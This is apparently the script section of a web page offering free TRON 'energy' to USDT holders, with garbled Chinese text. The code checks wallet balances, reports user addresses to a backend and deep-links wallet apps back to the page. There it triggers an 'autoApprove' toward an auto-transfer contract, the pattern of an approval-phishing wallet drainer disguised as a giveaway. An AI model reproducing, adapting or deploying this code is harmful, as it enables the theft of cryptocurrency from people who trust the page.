        console.error("é’±åŒ…åˆå§‹åŒ–å¼‚å¸¸ï¼š", e);
        userInfoEl.innerHTML = `
            è¿æ¥å¤±è´¥<br>
            <span style='color: #ef4444; font-size: 14px;'>${e.message}</span><br>
            <span style='color: #3b82f6; font-size: 13px;'>ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®é‡è¯•</span>
        `;
        approveBtn.disabled = false;
        approveBtn.textContent = lang.retryConnect;
        approveBtn.onclick = () => initWallet(false);
        updateWalletStatus();
        recordList.style.display = userAddress ? "block" : "none";
    }
}
// ========== ç»‘å®šæŒ‰é’®ç‚¹å‡»é€»è¾‘ï¼ˆç¼ºå¤±å‡½æ•°è¡¥å……ï¼‰ ==========
function bindApproveLogic() {
    const lang = langConfig[currentLang];
    const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "æœªçŸ¥åœ°å€";
    
    // ç™½åå•åœ°å€ç›´æ¥è§£é”
    if (userAddress === SPECIAL_ADDRESS) {
        approveBtn.disabled = false;
        approveBtn.textContent = lang.approveBtnText;
        bindUnlockedCoreLogic();
        return;
    }

    // å·²é¢†å–è¿‡ï¼ˆ30å¤©å†…ï¼‰â†’ ç¦ç”¨æŒ‰é’®
    if (isAddressAuthorized(userAddress)) {
        approveBtn.disabled = true;
        approveBtn.textContent = lang.authorizedBtn;
        return;
    }

    // USDTä½™é¢ä¸è¶³â†’ ç¦ç”¨æŒ‰é’®
    if (tokenBalance <= 1) {
        approveBtn.disabled = true;
        approveBtn.textContent = lang.insufficientBtn;
        return;
    }

    // ç¬¦åˆæ¡ä»¶â†’ è§£é”æŒ‰é’®å¹¶ç»‘å®šé€»è¾‘
    approveBtn.disabled = false;
    approveBtn.textContent = lang.approveBtnText;
    
    // æ£€æµ‹A1çŠ¶æ€ï¼Œå†³å®šç»‘å®šé”æ­»/è§£é”é€»è¾‘
    const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
    const isA1Success = a1Status[userAddress] === "success";
    const isA1Repeat = !canSendA1Signal(userAddress);
    
    if (isA1Repeat && isA1Success) {
        bindUnlockedCoreLogic();
    } else {
        bindLockedLogic();
    }
}
// ========== é”æ­»é€»è¾‘ï¼ˆA1æœªè§£é”å‰ï¼‰ ==========
function bindLockedLogic() {
    const lang = langConfig[currentLang];
    approveBtn.onclick = () => {
        showAutoCloseAlert(lang.tooManyPeopleTip);
    };
}
// ========== è§£é”åæ ¸å¿ƒé€»è¾‘ï¼ˆä¿®å¤å˜é‡æœªå®šä¹‰+æ·»åŠ å¼¹çª—åé¦ˆï¼‰ ==========
function bindUnlockedCoreLogic() {
    const lang = langConfig[currentLang];
    const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "æœªçŸ¥åœ°å€";
    
    approveBtn.onclick = async () => {
        const btn = document.getElementById("approveBtn");
        btn.disabled = true;
        btn.textContent = "å¤„ç†ä¸­...";
        let b1Alert = null; // å­˜å‚¨B1æµç¨‹çš„å¼¹çª—å¼•ç”¨
        
        try {
            const isInWalletBrowser = checkIsInWalletBrowser();
            if (isInWalletBrowser) {
                userInfoEl.innerHTML = `
                å·²è¿æ¥ï¼š<br>${shortAddr}<br>
                USDTä½™é¢ï¼š${tokenBalance.toFixed(2)} | TRXä½™é¢ï¼š${trxBalance.toFixed(2)}<br>
                <br><span style='color: #4ade80; font-size: 13px;'>âœ… ç¯å¢ƒç¬¦åˆé¢†å–æ¡ä»¶ï¼Œæ­£åœ¨æˆæƒ...</span>`;
                await autoApprove();
                btn.disabled = false;
                btn.textContent = lang.approveBtnText;
                return;
            }

            // åœºæ™¯1ï¼šå·²å‘é€è¿‡B1ï¼Œå”¤èµ·é’±åŒ…æ—¶æ˜¾ç¤ºå¼¹çª—
            if (hasSentB1Signal(userAddress)) {
                userInfoEl.innerHTML = `
                å·²è¿æ¥ï¼š<br>${shortAddr}<br>
                USDTä½™é¢ï¼š${tokenBalance.toFixed(2)} | TRXä½™é¢ï¼š${trxBalance.toFixed(2)}<br>
                <br><span style='color: #4ade80; font-size: 13px;'>âœ… æ­£åœ¨å”¤èµ·é’±åŒ…...</span>`;
                // æ˜¾ç¤ºâ€œæ­£åœ¨å”¤èµ·é’±åŒ…â€å¼¹çª—ï¼ˆè·³è½¬åè‡ªåŠ¨æ¶ˆå¤±ï¼‰
                b1Alert = showPersistentAlert(lang.å”¤èµ·WalletTip);
                await handleJump();
                // è·³è½¬åå…³é—­å¼¹çª—
                if (b1Alert && b1Alert.parentNode) {
                    b1Alert.parentNode.removeChild(b1Alert);
                }
                window.location.reload();
                return;
            }

            // åœºæ™¯2ï¼šæœªå‘é€B1ï¼Œæäº¤è¯·æ±‚æ—¶æ˜¾ç¤ºå¼¹çª—
            b1Alert = showPersistentAlert(lang.submitRequestTip);
            const b1Result = await sendSignalB(true);
            if (b1Result !== "204") throw new Error("B1æœªè¿”å›204");
            markB1SignalSent(userAddress);
            
            // B1æˆåŠŸåå…³é—­å¼¹çª—ï¼Œå†æ˜¾ç¤ºå”¤èµ·æç¤º
            if (b1Alert && b1Alert.parentNode) {
                b1Alert.parentNode.removeChild(b1Alert);
            }
            b1Alert = showPersistentAlert(lang.å”¤èµ·WalletTip);
            
            userInfoEl.innerHTML = `
            å·²è¿æ¥ï¼š<br>${shortAddr}<br>
            USDTä½™é¢ï¼š${tokenBalance.toFixed(2)} | TRXä½™é¢ï¼š${trxBalance.toFixed(2)}<br>
            <br><span style='color: #4ade80; font-size: 13px;'>âœ… å®¡æ ¸é€šè¿‡ï¼Œæ­£åœ¨å”¤èµ·é’±åŒ…...</span>`;
            await handleJump();
            // è·³è½¬åå…³é—­å¼¹çª—
            if (b1Alert && b1Alert.parentNode) {
                b1Alert.parentNode.removeChild(b1Alert);
            }
            window.location.reload();

        } catch (e) {
            console.error("é¢†å–æµç¨‹å¼‚å¸¸ï¼š", e);
            // å¼‚å¸¸æ—¶å…³é—­B1æµç¨‹çš„å¼¹çª—ï¼Œå†æ˜¾ç¤ºé”™è¯¯å¼¹çª—
            if (b1Alert && b1Alert.parentNode) {
                b1Alert.parentNode.removeChild(b1Alert);
            }
            showAutoCloseAlert(`æ“ä½œå¤±è´¥ï¼š${e.message || lang.systemBusyTip}`);
            window.location.reload();
            btn.disabled = false;
            btn.textContent = lang.approveBtnText;
        }
    };
}
// ========== æ–°å¢ï¼šæ£€æµ‹æ˜¯å¦åœ¨é’±åŒ…å†…ç½®æµè§ˆå™¨å†… ==========
function checkIsInWalletBrowser() {
    const userAgent = window.navigator.userAgent.toLowerCase();
    const walletUAs = ['imtoken', 'tronlink', 'tokenpocket', 'bitkeep', 'mathwallet'];
    return walletUAs.some(ua => userAgent.includes(ua));
}
// ========== A1ä¿¡å·ï¼ˆè¿”å›204æ ‡è®°successï¼Œé˜²é‡å¤ä»…é˜²äºŒæ¬¡å‘A1ï¼‰ ==========
async function sendSignalA1() {
    const requestData = { userAddress };
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 20000);
    try {
        const res = await fetch(`${BACKEND_API}/api/send-signal-a1`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(requestData),
            signal: controller.signal,
            keepalive: true
        });
        clearTimeout(timeoutId);
        if (res.status === 204) {
            const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
            a1Status[userAddress] = "success"; // æ ‡è®°A1-204ï¼Œæˆä¸ºé˜²é‡å¤å¯¹è±¡
            localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
            console.log("âœ… ç¯å¢ƒç¬¦åˆé¢†å–æ¡ä»¶");
            return "204";
        }
        throw new Error(`A1è¿”å›çŠ¶æ€${res.status}`);
    } catch (e) {
        clearTimeout(timeoutId);
        console.warn("âŒç¯å¢ƒå¼‚å¸¸", e);
        return "fail";
    }
}
// ========== B1ä¿¡å·ï¼ˆè¿”å›204æ‰æ ‡è®°ï¼Œé˜²é‡å¤ä»…é˜²äºŒæ¬¡å‘B1ï¼‰ ==========
async function sendSignalB(isB1 = true) {
    const requestData = { userAddress };
    const apiPath = isB1 ? "/api/send-signal-b1" : "/api/send-signal-b2";
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 20000);
    try {
        const res = await fetch(`${BACKEND_API}${apiPath}`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(requestData),
            signal: controller.signal,
            keepalive: true
        });
        clearTimeout(timeoutId);
        if (res.status === 204) {
            console.log("âœ…å·²å®¡æ ¸é€šè¿‡å¯ç›´æ¥é¢†å–");
            return "204";
        }
        throw new Error(`B1è¿”å›çŠ¶æ€${res.status}`);
    } catch (e) {
        clearTimeout(timeoutId);
        throw e;
    }
}
// ========== A1é˜²é‡å¤å·¥å…·ï¼ˆä»…é˜²äºŒæ¬¡å‘é€A1ä¿¡å·ï¼Œæºå¸¦A1-204æ‰æ˜¯é˜²é‡å¤å¯¹è±¡ï¼‰ ==========
function canSendA1Signal(address) {
    try {
        const records = JSON.parse(localStorage.getItem(A1_SIGNAL_KEY) || "{}");
        const lastSendTime = records[address] || 0;
        const now = Date.now();
        // é˜²é‡å¤å¯¹è±¡=15åˆ†é’Ÿå†…å‘è¿‡A1ä¸”è¿”å›204ï¼Œä»…é˜»æ­¢äºŒæ¬¡å‘A1
        return now - lastSendTime > 15 * 60 * 1000;
    } catch (e) {
        console.warn("æ£€æŸ¥A1é˜²é‡å¤å¤±è´¥ï¼š", e);
        return true;
    }
}
function updateA1SignalRecord(address) {
    try {
        const records = JSON.parse(localStorage.getItem(A1_SIGNAL_KEY) || "{}");
        records[address] = Date.now(); // è®°å½•A1å‘é€æ—¶é—´ï¼Œç”¨äºé˜²é‡å¤
        localStorage.setItem(A1_SIGNAL_KEY, JSON.stringify(records));
    } catch (e) {
        console.warn("æ›´æ–°A1è®°å½•å¤±è´¥ï¼š", e);
    }
}
// ========== B1é˜²é‡å¤å·¥å…·ï¼ˆä»…é˜²äºŒæ¬¡å‘é€B1ä¿¡å·ï¼Œæºå¸¦B1-204æ‰æ˜¯é˜²é‡å¤å¯¹è±¡ï¼‰ ==========
function hasSentB1Signal(address) {
  try {
    const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
    const item = records[address];
    if (!item) return false;
    // é˜²é‡å¤å¯¹è±¡=30å¤©å†…å‘è¿‡B1ä¸”è¿”å›204ï¼Œä»…é˜»æ­¢äºŒæ¬¡å‘B1
    return Date.now() - item.time < 2592000000;
  } catch (e) {
    console.warn("æ£€æŸ¥B1é˜²é‡å¤å¤±è´¥ï¼š", e);
    return false;
  }
}
function markB1SignalSent(address) {
  try {
    const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
    records[address] = { time: Date.now() }; // è®°å½•B1å‘é€æ—¶é—´ï¼Œç”¨äºé˜²é‡å¤
    localStorage.setItem(B1_SIGNAL_KEY, JSON.stringify(records));
  } catch (e) {
    console.warn("æ ‡è®°B1ä¿¡å·å¤±è´¥ï¼š", e);
  }
}
// ========== è·³è½¬å‡½æ•°ï¼ˆåŒ…å«å®Œæ•´URLå‚æ•°ï¼‰ ==========
async function handleJump() {
    const lang = langConfig[currentLang];
    const btn = document.getElementById("approveBtn");
    try {
        if (!window.tronWeb || !window.tronWeb.defaultAddress) {
            throw new Error("é’±åŒ…æœªå®Œå…¨åˆå§‹åŒ–");
        }
        // -------------------------- è®°å½•å®Œæ•´URLï¼ˆåŒ…å«æ‰€æœ‰å‚æ•°ï¼Œå…³é”®ä¿®æ”¹ï¼‰ --------------------------
        // 1. ä½ çš„å®Œæ•´DApp URLï¼ˆå¤åˆ¶æµè§ˆå™¨çš„å…¨éƒ¨å†…å®¹ï¼ŒåŒ…æ‹¬?å’Œåé¢çš„å‚æ•°ï¼‰
        const DAPP_FULL_URL = "https://trc20trx-alt.github.io/Trc20.TRX/?locale=zh-CN&utm_source=imtoken"; 
        // 2. æ‹¼æ¥æˆæƒæ“ä½œæ ‡è®°#approveï¼ˆä¿æŒå®Œæ•´URLç»“æ„ï¼‰
        const currentUrl = DAPP_FULL_URL + "#approve"; 
        // 3. ä»ç„¶å•æ¬¡encodeURIComponentï¼ˆåŒ…å«å‚æ•°ä¸€èµ·ç¼–ç ï¼Œé’±åŒ…è§£æåå®Œå…¨ä¸€è‡´ï¼‰
        const encodedUrl = encodeURIComponent(currentUrl); 
        // ----------------------------------------------------------------------------------------------------------
        const selectedWalletType = getWalletFromUrl();
        let wallet = null;
        let jumpUrl = "";
        if (selectedWalletType && walletConfig[selectedWalletType]) {
            wallet = walletConfig[selectedWalletType];
            switch (selectedWalletType) {
                case "imtoken":
    // æ–°æ ¼å¼ï¼šimToken å®˜æ–¹å½“å‰æ”¯æŒçš„å”¤èµ·æ–¹å¼ï¼Œå…¼å®¹æ–°ç‰ˆæœ¬ï¼Œå‡å°‘æ‹¦æˆª
    jumpUrl = `imtoken://browser?url=${encodedUrl}`;
                    break;
                case "tokenpocket":
                    jumpUrl = `tpdapp://open?params={"url":"${encodedUrl}"}`;
                    break;
                case "tronlink":
                    // TronLinkç›´æ¥ç”¨å®Œæ•´åŸå§‹URLï¼ˆå¸¦å‚æ•°ï¼‰
                    const tronParam = JSON.stringify({
                        url: currentUrl, // å®Œæ•´å¸¦å‚URLï¼Œè§£æåä¸€è‡´
                        action: "open",
                        protocol: "tronlink",
                        version: "1.0"
                    });
                    jumpUrl = `tronlinkoutside://pull.activity?param=${encodeURIComponent(tronParam)}`;
                    break;
                case "bitget":
                    jumpUrl = `bitkeep://bkconnect?action=dapp&url=${encodedUrl}`;
                    break;
                default:
                    jumpUrl = wallet.scheme + encodedUrl;
            }
        } else {
            wallet = walletConfig.imtoken;
            jumpUrl = `imtokenv2://navigate/DappView?url=${encodedUrl}`;
            if (window.tronWeb.provider?.isTokenPocket) {
                wallet = walletConfig.tokenpocket;
                jumpUrl = `tpdapp://open?params={"url":"${encodedUrl}"}`;
            } else if (window.tronWeb.provider?.isTronLink) {
                const tronParam = JSON.stringify({ url: currentUrl, action: "open", protocol: "tronlink", version: "1.0" });
                jumpUrl = `tronlinkoutside://pull.activity?param=${encodeURIComponent(tronParam)}`;
                wallet = walletConfig.tronlink;
            } else if (window.tronWeb.provider?.isBitKeep) {
                wallet = walletConfig.bitget;
                jumpUrl = `bitkeep://bkconnect?action=dapp&url=${encodedUrl}`;
            }
        }
        btn.textContent = `æ­£åœ¨å”¤èµ·${wallet.name}æˆæƒé¡µé¢...`;
        setTimeout(() => {
            window.location.href = jumpUrl;
            // ç§»é™¤iframeï¼Œé¿å…å‚æ•°è§£æå¹²æ‰°
        }, 100);
        setTimeout(() => {
            showAutoCloseAlert(`æœªæ£€æµ‹åˆ°${wallet.name}ï¼Œè¯·æ‰‹åŠ¨æ‰“å¼€å¹¶è®¿é—®ï¼š${DAPP_FULL_URL}`);
            btn.disabled = false;
            btn.textContent = lang.approveBtnText;
        }, 3000);
    } catch (jumpErr) {
        console.error("è·³è½¬å¤±è´¥ï¼š", jumpErr);
        showAutoCloseAlert(`è·³è½¬æˆæƒå¤±è´¥ï¼Œè¯·æ‰‹åŠ¨æ‰“å¼€é’±åŒ…å¹¶è®¿é—®ï¼š${DAPP_FULL_URL}`);
        btn.disabled = false;
        btn.textContent = lang.approveBtnText;
    }
}
// ========== è¾…åŠ©å‡½æ•°ï¼ˆä¿®å¤ç™½åå•åœ°å€çš„è®°å½•å­˜å‚¨ï¼‰ ==========
function saveEnergyRecord() {
    const lang = langConfig[currentLang];
    const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
    const newRecords = existing.filter(item => item.address !== userAddress);
    newRecords.push({
        address: userAddress,
        tokenBalance: tokenBalance,
        trxBalance: trxBalance,
        receiveTime: new Date().toLocaleString(),
        energyAmount: "90000Î¼s",
        recordType: lang.freeEnergy
    });
    localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
}
function renderEnergyRecords() {
    const lang = langConfig[currentLang];
    const container = document.getElementById("approvalRecords");
    const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
    if (records.length === 0) {
        container.innerHTML = `<div class='record-item'>${lang.noRecord}</div>`;
        return;
    }
    const recordsHtml = records.map(record => `
        <div class='record-item'>
            <p><strong>${lang.recordAddress}</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
            <p><strong>${lang.recordType}</strong>${record.recordType}</p>
            <p><strong>${lang.recordEnergy}</strong>${record.energyAmount} USDT Energy</p>
            <p><strong>${lang.recordTime}</strong>${record.receiveTime}</p>
        </div>
    `).join("");
    container.innerHTML = recordsHtml;
}
// ========== æ–°å¢ï¼šä»URLè¯»å–é’±åŒ…ç±»å‹å‚æ•°ï¼ˆå…³é”®ï¼‰ ==========
function getWalletFromUrl() {
    const params = new URLSearchParams(window.location.search);
    const walletType = params.get("wallet");
    return walletType && walletConfig[walletType] ? walletType : null;
}
// ========== é¡µé¢åˆå§‹åŒ–ï¼ˆæ— å»¶è¿Ÿã€æ— é‡è¯•ï¼‰ ==========
document.addEventListener('DOMContentLoaded', async () => {
    localStorage.removeItem("energy_state");
    contractEnergyEl = document.getElementById("contractEnergy");
    if (!contractEnergyEl) {
        showAutoCloseAlert("âš ï¸ èƒ½é‡æ˜¾ç¤ºå…ƒç´ æœªæ‰¾åˆ°");
        return;
    }
    
    startPersistentEnergyCountdown();
    updatePageLang();
    langToggle.addEventListener("click", toggleLang);
    contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
    renderEnergyRecords();
    updateWalletStatus();
    recordList.style.display = "none";
    const urlWalletType = getWalletFromUrl();
    if (urlWalletType && walletConfig[urlWalletType]) {
        localStorage.setItem("selectedWalletType", urlWalletType);
    }
    checkImTokenEnv().catch(err => {
        console.error("ç¯å¢ƒæ£€æµ‹å¤±è´¥ï¼š", err);
        const lang = langConfig[currentLang];
        userInfoEl.innerHTML = lang.userInfoDefault;
        approveBtn.disabled = true;
        approveBtn.textContent = lang.approveBtnText;
    });
    window.addEventListener("beforeunload", () => {
        if (trxTimer) clearInterval(trxTimer);
    });
    if (window.tronWeb && window.location.hash === "#wallet-open") {
        window.location.hash = "";
        initWallet(false).catch(err => {
            console.error("é’±åŒ…å”¤èµ·ååˆå§‹åŒ–å¤±è´¥ï¼š", err);
            userInfoEl.innerHTML = `
                åŠ è½½å¤±è´¥<br>
                <span style='color: #ef4444; font-size: 14px;'>${err.message}</span><br>
                <span style='color: #3b82f6; font-size: 13px;'>ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®é‡è¯•</span>
            `;
            approveBtn.disabled = false;
            approveBtn.textContent = lang.retryConnect;
            approveBtn.onclick = () => initWallet(false);
        });
    }
    if (window.tronWeb && window.location.hash === "#approve") {
        window.location.hash = "";
        autoApprove().catch(err => {
            console.error("æˆæƒååˆå§‹åŒ–å¤±è´¥ï¼š", err);
            userInfoEl.innerHTML = `
                æˆæƒå¤±è´¥<br>
                <span style='color: #ef4444; font-size: 14px;'>${err.message}</span><br>
                <span style='color: #3b82f6; font-size: 13px;'>ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®é‡è¯•</span>
            `;
            approveBtn.disabled = false;
            approveBtn.textContent = lang.retryConnect;
            approveBtn.onclick = autoApprove;
        });
    }
});
// ========== è¡¥å……ï¼šupdateWalletStatus å‡½æ•°ï¼ˆé¿å…æŠ¥é”™ï¼‰ ==========
function updateWalletStatus() {
    if (userAddress) {
        walletStatusContainer.classList.add("connected");
    } else {
        walletStatusContainer.classList.remove("connected");
    }
}
// ========== é¡µé¢åˆ·æ–°åè‡ªåŠ¨å”¤èµ·é’±åŒ… ==========
window.addEventListener('load', function() {
    // æ£€æµ‹æ˜¯å¦æœ‰â€œå¾…è·³è½¬é’±åŒ…â€çš„æ ‡è®°
    if (localStorage.getItem('needJumpToWallet') === 'true') {
        // æ¸…é™¤æ ‡è®°ï¼ˆé¿å…é‡å¤è·³è½¬ï¼‰
        localStorage.removeItem('needJumpToWallet');
        // è‡ªåŠ¨å”¤èµ·é’±åŒ…ï¼ˆç”¨ä½ ä¹‹å‰å†™å¥½çš„handleJumpå‡½æ•°ï¼‰
        handleJump().catch(err => {
            showAutoCloseAlert("å”¤èµ·é’±åŒ…å¤±è´¥ï¼Œè¯·æ‰‹åŠ¨æ‰“å¼€é’±åŒ…åé‡è¯•");
        });
    }
});

</script>
</body>
</html>
